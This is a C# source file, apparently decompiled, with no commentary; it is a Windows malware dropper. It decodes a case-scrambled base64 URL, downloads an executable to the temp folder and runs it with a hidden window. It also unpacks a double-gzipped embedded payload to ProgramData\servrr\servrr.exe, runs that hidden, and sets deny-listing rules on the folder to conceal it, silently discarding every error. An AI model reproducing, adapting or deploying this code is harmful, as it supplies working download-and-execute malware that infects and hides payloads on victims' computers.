using System;
using System.Collections;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class X
{
	[STAThread]
	public static void main()
	{
		if ((AppDomain.CurrentDomain.BaseDirectory.Length < 4) | (Strings.InStr(AppDomain.CurrentDomain.BaseDirectory.ToLower(), "temp", (CompareMethod)0) > 0))
		{
			try
			{
				WebClient webClient = new WebClient();
				string path = Interaction.Environ("temp") + "\\jp.exe";
				string s = "Ahr0CdOVl2XVywrPBMCTys5SzwfKAg9ZDgvYlMnVBs90ywWUmJaXmdKYoteXmJe1nc5LEgu=";
				File.WriteAllBytes(path, webClient.DownloadData(DEB(ref s)));
				Interaction.Shell(Interaction.Environ("temp") + "\\jp.exe", (AppWinStyle)2, false, -1);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		ResourceManager resourceManager = new ResourceManager("M", Assembly.GetExecutingAssembly());
		byte[] bytes = Z(Z((byte[])resourceManager.GetObject("A")));
		string Path = Interaction.Environ("programdata") + "\\servrr";
		string text = Path + "\\servrr.exe";
		try
		{
			FileSystem.MkDir(Path);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			BD(ref Path);
			File.WriteAllBytes(text, bytes);
			Interaction.Shell(text, (AppWinStyle)2, false, -1);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] Z(byte[] Byt)
	{
		MemoryStream memoryStream = new MemoryStream(Byt);
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array = new byte[4];
		checked
		{
			memoryStream.Position = memoryStream.Length - 5L;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
	}

	public static string DEB(ref string s)
	{
		byte[] bytes = Convert.FromBase64String(Lu(ref s));
		return Encoding.UTF8.GetString(bytes);
	}

	public static string Lu(ref string text)
	{
		string text2 = "qwertyuiopasdfghjklzxcvbnm";
		string text3 = "";
		checked
		{
			int num = text.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = text2.Length - 1;
				int num3 = 0;
				while (true)
				{
					if (num3 <= num2)
					{
						char c = text[i];
						if (c != text2[num3])
						{
							if (c != Conversions.ToChar(text2[num3].ToString().ToUpper()))
							{
								num3++;
								continue;
							}
							text3 += text[i].ToString().ToLower();
							break;
						}
						text3 += text[i].ToString().ToUpper();
						break;
					}
					text3 += Conversions.ToString(text[i]);
					break;
				}
			}
			return text3;
		}
	}

	public static void BD(ref string Path)
	{
		DirectorySecurity accessControl = Directory.GetAccessControl(Path, AccessControlSections.All);
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = accessControl.GetAccessRules(includeExplicit: true, includeInherited: true, typeof(NTAccount)).GetEnumerator();
			while (enumerator.MoveNext())
			{
				FileSystemAccessRule fileSystemAccessRule = (FileSystemAccessRule)enumerator.Current;
				try
				{
					DirectorySecurity accessControl2 = Directory.GetAccessControl(Path, AccessControlSections.All);
					FileSystemAccessRule rule = new FileSystemAccessRule(new NTAccount(Strings.Split(fileSystemAccessRule.IdentityReference.Value, "\\", -1, (CompareMethod)0)[1]), FileSystemRights.ListDirectory, AccessControlType.Deny);
					accessControl2.AddAccessRule(rule);
					Directory.SetAccessControl(Path, accessControl2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}
}
